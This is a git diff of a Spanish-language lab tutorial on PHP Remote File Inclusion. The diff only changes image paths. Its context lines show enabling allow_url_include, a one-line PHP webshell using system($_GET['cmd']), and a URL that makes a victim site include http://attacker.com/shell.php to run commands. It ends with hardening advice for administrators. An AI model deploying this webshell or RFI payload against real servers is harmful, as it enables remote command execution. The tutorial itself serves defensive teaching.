@@ -26,11 +26,11 @@ En este caso alojaremos una WebShell como POC.
     - **Máquina atacante**: Kali Linux => 192.168.1.20
     - **Máquina servidor WEB**: Ubuntu  => 192.168.1.30
 
-![img0](../../../assets/images/remote-file-inclusion-rfi-web/entorno.png)
+![img0](./entorno.png)
 
 Para poder lograr explotar esta vulnerabilidad, deberemos crear un archivo PHP que permita la inclusión de archivos:
 
-![img1](../../../assets/images/remote-file-inclusion-rfi-web/portada.png)
+![img1](./portada.png)
 
 Este código básico permite que el servidor reciba un valor mediante una solicitud GET a través del parámetro file e incluya el archivo correspondiente en la página.
 
@@ -39,19 +39,19 @@ Servidor WEB
 ```
 php -S 192.168.1.30:80
 ```
-![img1](../../../assets/images/remote-file-inclusion-rfi-web/phpserv1.png)
+![img1](./phpserv1.png)
 
 Kali Linux
 ```
 http://192.168.1.30/?file=flag.txt
 ```
-![img2](../../../assets/images/remote-file-inclusion-rfi-web/lfi.png)
+![img2](./lfi.png)
 
 Para lograr un **Remote File Inclusion (RFI)** y poder subir un archivo al servidor de forma remota, es necesario modificar la configuración de PHP en el archivo ``php.ini``. En particular, hay que habilitar la opción que permite la inclusión de archivos desde URLs remotas.
 
 Dentro de este archivo, tenemos que buscar la variable allow_url_include:
 
-![img3](../../../assets/images/remote-file-inclusion-rfi-web/include.png)
+![img3](./include.png)
 
 Una vez que se ha habilitado la **inclusión remota de archivos (RFI)** y se ha configurado adecuadamente el archivo ``php.ini``, el siguiente paso es intentar llamar nuestra webshell para poder lanzar comandos remotamente.
 
@@ -59,7 +59,7 @@ Una vez que se ha habilitado la **inclusión remota de archivos (RFI)** y se ha 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
-![img4](../../../assets/images/remote-file-inclusion-rfi-web/python3.png)
+![img4](./python3.png)
 
 Este código PHP permite ejecutar comandos del sistema que se pasan como parámetros en la URL. Por ejemplo, si visitamos ``http://attacker.com/shell.php?cmd=ls``, el servidor devolverá el resultado del comando ls ejecutado en la máquina atacante.
 
@@ -72,7 +72,7 @@ La URL para incluir la webshell en el servidor víctima podría verse algo así:
 http://victimsite.com/index.php?file=http://attacker.com/shell.php&cmd=id
 ``
 
-![img5](../../../assets/images/remote-file-inclusion-rfi-web/rcc.png)
+![img5](./rcc.png)
    
 Estamos ejecutando comandos localmente usando un archivo remoto. Esto es básicamente un Remote File Inclusion.
 
@@ -85,4 +85,4 @@ En este post, hemos demostrado cómo un atacante puede aprovechar esta vulnerabi
 
 Es fundamental que los administradores de sistemas mantengan configuraciones seguras, validen entradas de usuario adecuadamente y desactiven opciones inseguras como la inclusión remota de archivos. La prevención de ataques RFI es crucial para proteger los servidores de ataques externos que pueden tener consecuencias devastadoras.
 
-![img6](../../../assets/images/remote-file-inclusion-rfi-web/rig.png)
+![img6](./rig.gif)
